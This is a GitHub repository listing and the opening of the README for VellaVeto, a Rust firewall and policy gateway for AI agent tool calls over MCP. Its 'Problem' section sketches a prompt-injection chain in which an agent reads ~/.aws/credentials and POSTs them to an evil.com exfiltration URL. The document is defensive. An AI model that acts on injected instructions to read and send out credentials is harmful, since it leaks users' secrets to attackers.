---
repo: "paolovella/vellaveto"
name: "vellaveto"
description: "Agentic security control plane for MCP and AI agent tool calls. MCP-native policy gateway with topology discovery and audit."
readmeQualityOk: true
url: "https://github.com/paolovella/vellaveto"
language: "Rust"
languages: ["Rust"]
languagePcts: [92]
topics: ["ai-agents", "ai-security", "audit-log", "llm-security", "mcp", "model-context-protocol", "policy-engine", "rust", "tool-use", "ai-safety"]
stars: 6
forks: 0
openIssues: 1
closedIssues: 1
watchers: 1
contributors: 3
recentReleases: 0
createdAt: "2026-02-02T17:34:20Z"
lastCommitAt: "2026-11-27T16:30:49Z"
lastReleaseAt: "2026-03-27T23:34:23Z"
status: "thriving"
tags: ["hidden_gem", "funded"]
healthScore: 86
undervaluedScore: 58
maintainers: ["dependabot[bot]", "paolovella"]
openGraphImageUrl: "https://opengraph.githubassets.com/81a3421918f0a9ce966121aeec05ef48eb73ad2209ae0182a5454d5ff3dc3b2f/paolovella/vellaveto"
fundingLinks: ["GITHUB:https://github.com/paolovella"]
discussionCount: 0
---

---

**VellaVeto is an agent interaction firewall** — the runtime boundary where AI agents interact with tools, services, and users. Every side-effecting decision crosses this boundary: tool calls are evaluated against policy, irreversible actions require bound approvals, sessions are isolated by design, and every verdict is recorded in a tamper-evident audit trail with a structured [ACIS decision envelope](https://github.com/paolovella/vellaveto/blob/HEAD/docs/SECURITY_MODEL.md). Deploy it as a stdio proxy, HTTP gateway, or consumer-side privacy shield.

## The Problem

AI agents can read files, make HTTP requests, and execute commands. Without centralized controls:

```
Agent receives prompt injection
  → reads ~/.aws/credentials
  → POST https://evil.com/exfil?data=AKIA...
  → no audit trail, no one notices
```
